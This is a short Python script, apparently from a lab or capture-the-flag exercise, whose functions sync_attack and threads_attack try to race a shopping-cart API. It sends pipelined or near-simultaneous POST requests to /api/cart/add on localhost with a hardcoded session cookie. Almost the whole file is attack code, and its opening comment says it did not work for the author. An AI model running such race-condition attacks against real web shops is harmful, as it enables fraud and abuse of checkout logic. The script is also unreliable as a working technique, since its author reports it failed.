# It didn't work for me tbh

import socket
import json
import datetime as dt
import threading
import time

session_id = "Yw7673BtAGnUgYrMM0w9HK9VW6Miwt0LTSpHy0GMnJQ="
host = "localhost"
port = 80

def create_payload(id: int) -> bytes:
    body = json.dumps({"product_id": id,"count": 1})
    content_length = len(body)

    headers = (
        "POST /api/cart/add HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0\r\n"
        "Accept: */*\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate, br, zstd\r\n"
        "Referer: http://localhost/home\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {content_length}\r\n"
        "Origin: http://localhost\r\n"
        "Connection: keep-alive\r\n"
        f"Cookie: session_id={session_id}\r\n"
        "Sec-Fetch-Dest: empty\r\n"
        "Sec-Fetch-Mode: cors\r\n"
        "Sec-Fetch-Site: same-origin\r\n"
        "Priority: u=0\r\n"
        "\r\n"
    )
    return (headers + body).encode()

def sync_attack():
    ids = 6
    s = socket.socket()
    s.connect((host, port))

    results = []

    payloads = [create_payload(id) for id in range(ids)]
    for i, payload in enumerate(payloads):
        send_time = dt.datetime.now(dt.UTC).strftime('%H:%M:%S.%f')
        s.send(payload)
        print(f"Запрос {i+1} отправлен в {send_time}")
        
    for i in range(ids):
        results += [s.recv(2048).decode()]

    print("\n\n".join(results))

    s.close()

def threads_attack():
    start_delay = 0.000001 
    threads = [threading.Thread(target=send_request, args=(id, id * start_delay)) for id in range(6)]
    for i, t in enumerate(threads):
        t.start()
    for t in threads:
        t.join()

def send_request(id: int, delay: float):
    time.sleep(delay)
    s = socket.socket()
    s.connect((host, port))
    payload = create_payload(id)
    send_time = dt.datetime.now(dt.UTC).strftime('%H:%M:%S.%f')
    s.send(payload)
    print(f"Запрос {id+1} отправлен в {send_time}")
    print("\n\n", s.recv(1024).decode(), "\n\n")
    s.close()

if __name__ == "__main__":
    sync_attack()